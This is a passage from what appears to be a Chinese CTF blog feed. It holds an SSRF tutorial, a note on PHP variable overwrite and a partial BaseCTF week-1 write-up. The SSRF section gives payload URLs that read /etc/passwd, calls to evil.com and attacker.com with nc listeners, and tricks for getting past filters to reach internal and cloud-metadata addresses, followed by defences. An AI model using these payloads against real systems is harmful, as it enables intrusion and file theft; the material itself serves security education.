class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意事项:</p><p>1.一般情况下PHP不会开启fopen的gopher wrapper<br>2.file_get_contents的gopher协议不能URL编码<br>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br>4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br>5.curl_exec() 默认不跟踪跳转，<br>6.file_get_contents() file_get_contents支持php://input协议</p><p>五、SSRF中URL的伪协议<br>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p><p>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd<br>dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：<br>sftp:// SSH文件传输协议或安全文件传输协议<br>ldap:// 轻量级目录访问协议<br>tftp:// 简单文件传输协议<br>gopher:// 分布式文档传递服务，可使用gopherus生成payload</p><p>1、file</p><p>这种URL Schema可以尝试从文件系统中获取文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/ssrf.php?url=file:/</span><span class="regexp">//</span>etc/passwd</span><br><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/ssrf.php?url=file:/</span><span class="regexp">//</span>C:<span class="regexp">/Windows/</span>win.ini</span><br></pre></td></tr></table></figure><p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p><p>2、dict</p><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?dict://evil.com:<span class="number">1337</span>/</span><br><span class="line"><span class="attribute">evil</span>.com:$ nc -lvp <span class="number">1337</span></span><br><span class="line"><span class="attribute">Connection</span> from<span class="meta"> [192.168.0.12] port 1337[tcp/*]</span></span><br><span class="line"><span class="attribute">accepted</span> (family <span class="number">2</span>, sport <span class="number">31126</span>)CLIENT libcurl <span class="number">7</span>.<span class="number">40</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>3、sftp</p><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?url=sftp://evil.com:<span class="number">1337</span>/</span><br><span class="line"><span class="attribute">evil</span>.com:$ nc -lvp <span class="number">1337</span></span><br><span class="line"><span class="attribute">Connection</span> from<span class="meta"> [192.168.0.12] port 1337[tcp/*]</span></span><br><span class="line"><span class="attribute">accepted</span> (family <span class="number">2</span>, sport <span class="number">37146</span>)SSH-<span class="number">2</span>.<span class="number">0</span>-libssh2_1.<span class="number">4</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure><p>4、ldap://或ldaps:// 或ldapi://</p><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?url=ldap://localhost:<span class="number">1337</span>/%<span class="number">0</span>astats%<span class="number">0</span>aquit</span><br><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?url=ldaps://localhost:<span class="number">1337</span>/%<span class="number">0</span>astats%<span class="number">0</span>aquit</span><br><span class="line"><span class="attribute">http</span>://example.com/ssrf.php?url=ldapi://localhost:<span class="number">1337</span>/%<span class="number">0</span>astats%<span class="number">0</span>aquit</span><br></pre></td></tr></table></figure><p>5、tftp://</p><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/ssrf.php?url=tftp:/</span><span class="regexp">/evil.com:1337/</span>TESTUDPPACKET</span><br><span class="line">evil.com:<span class="comment"># nc -lvup 1337</span></span><br><span class="line">Listening on [<span class="number">0.0</span>.<span class="number">0.0</span>] (family <span class="number">0</span>, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure><p>6、gopher://</p><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">evil.com:# nc -lvp 1337</span></span><br><span class="line"><span class="language-xml">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span></span><br></pre></td></tr></table></figure><p>六、SSRF漏洞利用（危害）<br>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。.</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="number">192.168</span><span class="number">.64</span><span class="number">.144</span><span class="keyword">/phpmyadmin/</span></span><br><span class="line"><span class="symbol">file:</span><span class="comment">///D:/www.txt</span></span><br><span class="line"><span class="symbol">dict:</span><span class="comment">//192.168.64.144:3306/info</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//192.168.64.144:21</span></span><br></pre></td></tr></table></figure><p>七、SSRF绕过方式<br>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p><p>一、常见的绕过方式</p><p>1、限制为<a href="http://www.xxx.com">http://www.xxx.com</a> 域名时（利用@）</p><p>可以尝试采用http基本身份认证的方式绕过<br>如：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.aaa.com<span class="variable">@www</span>.bbb.com<span class="variable">@www</span>.ccc.com</span><br></pre></td></tr></table></figure><p>，在对@解析域名中，不同的处理函数存在处理差异<br>在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</p><p>2.采用短网址绕过</p><p>比如百度短地址<a href="https://dwz.cn/">https://dwz.cn/</a></p><p>3.采用进制转换</p><p>127.0.0.1</p><p>八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p><p>4.利用特殊域名</p><p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p><p>5.利用[::]</p><p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254&gt;&gt;http://[::169.254.169.254">http://169.254.169.254&gt;&gt;http://[::169.254.169.254</a>]</p><p>6.利用句号</p><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p><p>7、CRLF 编码绕过</p><p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">example</span>.com/?url=http://eval.com%<span class="number">0</span>d%<span class="number">0</span>aHOST:fuzz.com%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>8.利用封闭的字母数字</p><p>利用Enclosed alphanumerics</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line"><span class="link">http://169.254.169.254&gt;&gt;&gt;http://</span>[<span class="string">::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④</span>]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><p>二、常见限制</p><p>1.限制为<a href="http://www.xxx.com">http://www.xxx.com</a> 域名</p><p>采用http基本身份认证的方式绕过，即@</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//www.xxx.com@www.xxc.com</span></span><br></pre></td></tr></table></figure><p>2.限制请求IP不为内网地址</p><p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p><p>3.限制请求只为http协议</p><p>（1）采取302跳转<br>（2）采取短地址</p><p>八、SSRF漏防御<br>通常有以下5个思路：</p><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖漏洞</title>
      <link href="/posts/e2679a86.html"/>
      <url>/posts/e2679a86.html</url>
      
        <content type="html"><![CDATA[<h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><p>记录网站：【CTF_Web：php中的变量覆盖问题 - CSDN App】<a href="http://t.csdnimg.cn/LAmY1">http://t.csdnimg.cn/LAmY1</a></p><h2 id="变量覆盖函数-parse-str-、extract-、import-request-variables"><a href="#变量覆盖函数-parse-str-、extract-、import-request-variables" class="headerlink" title="变量覆盖函数:parse_str() 、extract()、import_request_variables()"></a>变量覆盖函数:parse_str() 、extract()、import_request_variables()</h2><p>1.什么是变量覆盖<br>变量覆盖基本都来自于各种函数（parse_str() 、extract()、import_request_variables()等）对用户输入取值时的问题，当用户对已经存在的变量再次通过<br>各种函数赋值时，将会触发变量覆盖，修改之前定义的值，这类问题需要严格定义用户可以输入的部分，或值避免使用存在此类问题的函数。</p><p>2.parse_str() 函数<br>原型：parse_str(string,array)<br>定义和用法：parse_str() 函数把查询字符串解析到变量中。<br>        如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。<br>        php.ini文件中的 magic_quotes_gpc设置影响该函数的输出。如果已启用，那么在 parse_str()解析之前，变量会被 addslashes()转换。<br>例子：<br>&lt;?php<br>parse_str(“name=Peter&amp;age=43”);<br>echo $name.”<br>“;   //Peter<br>echo $age;     //43<br>?&gt;</p><p>3.extract()函数<br>原型：extract(array,extract_rules,prefix)，其中第一个参数为指定的数组，第二个为创建变量的规则，第三个为需要增加的前缀。<br>1.array    必需。规定要使用的数组。<br>2.extract_rules      可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。<br>可能的值：<br>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。<br>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。<br>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。<br>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。<br>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。<br>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。<br>3.prefix      可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</p><p>定义和用法：<br>    extract() 函数从数组中将变量导入到当前的符号表。<br>    该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>    该函数返回成功设置的变量数目。<br>例子：<br>&lt;?php<br>$a = “Original”;<br>$my_array = array(“a” =&gt; “Cat”, “b” =&gt; “Dog”, “c” =&gt; “Horse”);<br>extract($my_array, EXTR_PREFIX_SAME, “dup”);<br>echo “$a = $a; $b = $b; $c = $c; $dup_a = $dup_a”;<br>?&gt;<br>//$a = Original; $b = Dog; $c = Horse; $dup_a = Cat   这里冲突后为冲突的变量加了前缀dup和下划线。<br>这个变量覆盖漏洞其实就是来源于EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</p><p>当没有指定规则的时候就会发生变量覆盖。<br>&lt;?php<br>$flag=”ook!”;<br>extract($_GET);<br>echo $flag;<br>if($key==$flag)<br>{<br>    echo $flag;<br>}<br>else<br>{<br>    echo’Oh.no’;<br>}<br>?&gt;<br>由于首先为flag赋值，后extract了GET的值，所以会将已经存在的进行覆盖。</p><p>4。import<em>request_variables()函数<br>原型：bool import_request_variables ( string $types [, string $prefix ] )返回bool型结果。<br>$types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。<br>$prefix： 变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref</em> 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。</p><p>定义和用法：<br>import_request_variables() 函数将 GET／POST／Cookie 变量导入到全局作用域中。该函数在最新版本的 PHP 中已经不支持。<br>import_request_variables() 函数将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。<br>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p><p>例子：<br>&lt;?php<br>// 此处将导入 GET 和 POST 变量<br>$a= “abc”;<br>import_request_variables(“gP”);  //不使用前缀将会覆盖。<br>echo $a;<br>?&gt;<br>传入?a=1111将会把已定义的a值覆盖。</p><h2 id=""><a href="#" class="headerlink" title="$$"></a>$$</h2><p>看下面这个例子：</p><p>$a=’hello’;<br>$b=’world’;</p><p>$$a=$b;<br>echo($hello);<br>最后的输出结果为world</p><p>这里先是定义了a,b两个变量，分别赋值hello和world。接着，<script type="math/tex">a表示将变量a的值变成一个变量即$hello，然后将变量b的值赋给它，最后输出world。所以在源码中看到</script>可以想到变量覆盖漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basectf比赛week1-wp</title>
      <link href="/posts/1886aec0.html"/>
      <url>/posts/1886aec0.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Basectf比赛week1-wp"><a href="#Basectf比赛week1-wp" class="headerlink" title="Basectf比赛week1-wp"></a>Basectf比赛week1-wp</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Week1-签到！DK-盾！"><a href="#Week1-签到！DK-盾！" class="headerlink" title="[Week1] 签到！DK 盾！"></a>[Week1] 签到！DK 盾！</h4><p>关注公众号得到flag。</p><h4 id="Week1-Base"><a href="#Week1-Base" class="headerlink" title="[Week1] Base"></a>[Week1] Base</h4><p>考点：base编码</p><p>下载附件得到一串base编码，解密得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815183028571.png" alt="image-20240815183028571"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815183051398.png" alt="image-20240815183051398"></p><h4 id="Week1-正着看还是反着看呢？"><a href="#Week1-正着看还是反着看呢？" class="headerlink" title="[Week1] 正着看还是反着看呢？"></a>[Week1] 正着看还是反着看呢？</h4><p>考点：文件逆序，文件分离</p><p>附件压缩包解压发现一个名为flag的未知文件，用010editor打开发现文件逆序了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815183306729.png" alt="image-20240815183306729"></p><p>使用脚本将文件顺序调换回来，得到一张jpg图片。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184020850.png" alt="image-20240815184020850"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184010960.png" alt="image-20240815184010960"></p><p>用010editor打开，发现藏了一个隐藏文件flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184131348.png" alt="image-20240815184131348"></p><p>提取出来得到flag.</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184306841.png" alt="image-20240815184306841"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184334599.png" alt="image-20240815184334599"></p><h4 id="Week1-海上遇到了鲨鱼"><a href="#Week1-海上遇到了鲨鱼" class="headerlink" title="[Week1] 海上遇到了鲨鱼"></a>[Week1] 海上遇到了鲨鱼</h4><p>考点：流量分析</p><p>打开是个pcapng文件，用wireshark打开。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184514652.png" alt="image-20240815184514652"></p><p>检索关键词flag，用tcp流打开，查看流，最后找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184725885.png" alt="image-20240815184725885"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184801405.png" alt="image-20240815184801405"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184832777.png" alt="image-20240815184832777"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240815184904549.png" alt="image-20240815184904549"></p><h4 id="Week1-人生苦短，我用Python"><a href="#Week1-人生苦短，我用Python" class="headerlink" title="[Week1] 人生苦短，我用Python"></a>[Week1] 人生苦短，我用Python</h4><p>考点：代码审计，搜索引擎</p><p>打开程序，一段超长python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abort</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You failed test %d. Try again!&#x27;</span> % <span class="built_in">id</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Hello, Python!&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Enter your flag: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">38</span>:</span><br><span class="line">    abort(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag.startswith(<span class="string">&#x27;BaseCTF&#123;&#x27;</span>):</span><br><span class="line">    abort(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.find(<span class="string">&#x27;Mp&#x27;</span>) != <span class="number">10</span>:</span><br><span class="line">    abort(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">3</span>:] * <span class="number">8</span> != <span class="string">&#x27;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;3x&#125;&#x27;</span>:</span><br><span class="line">    abort(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(flag[-<span class="number">1</span>]) != <span class="number">125</span>:</span><br><span class="line">    abort(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag.count(<span class="string">&#x27;_&#x27;</span>) // <span class="number">2</span> != <span class="number">2</span>:</span><br><span class="line">    abort(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">len</span>, flag.split(<span class="string">&#x27;_&#x27;</span>))) != [<span class="number">14</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>]:</span><br><span class="line">    abort(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">12</span>:<span class="number">32</span>:<span class="number">4</span>] != <span class="string">&#x27;lsT_n&#x27;</span>:</span><br><span class="line">    abort(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;😺&#x27;</span>.join([c.upper() <span class="keyword">for</span> c <span class="keyword">in</span> flag[:<span class="number">9</span>]]) != <span class="string">&#x27;B😺A😺S😺E😺C😺T😺F😺&#123;😺S&#x27;</span>:</span><br><span class="line">    abort(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> flag[-<span class="number">11</span>].isnumeric() <span class="keyword">or</span> <span class="built_in">int</span>(flag[-<span class="number">11</span>]) ** <span class="number">5</span> != <span class="number">1024</span>:</span><br><span class="line">    abort(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base64.b64encode(flag[-<span class="number">7</span>:-<span class="number">3</span>].encode()) != <span class="string">b&#x27;MG1QbA==&#x27;</span>:</span><br><span class="line">    abort(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[::-<span class="number">7</span>].encode().<span class="built_in">hex</span>() != <span class="string">&#x27;7d4372733173&#x27;</span>:</span><br><span class="line">    abort(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">set</span>(flag[<span class="number">12</span>::<span class="number">11</span>]) != &#123;<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>&#125;:</span><br><span class="line">    abort(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">21</span>:<span class="number">27</span>].encode() != <span class="built_in">bytes</span>([<span class="number">116</span>, <span class="number">51</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">104</span>]):</span><br><span class="line">    abort(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(<span class="built_in">ord</span>(c) * <span class="number">2024_08_15</span> ** idx <span class="keyword">for</span> idx, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag[<span class="number">17</span>:<span class="number">20</span>])) != <span class="number">41378751114180610</span>:</span><br><span class="line">    abort(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>([flag[<span class="number">0</span>].isalpha(), flag[<span class="number">8</span>].islower(), flag[<span class="number">13</span>].isdigit()]):</span><br><span class="line">    abort(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&#123;whats&#125; &#123;up&#125;&#x27;</span>.<span class="built_in">format</span>(whats=flag[<span class="number">13</span>], up=flag[<span class="number">15</span>]).replace(<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;bro&#x27;</span>) != <span 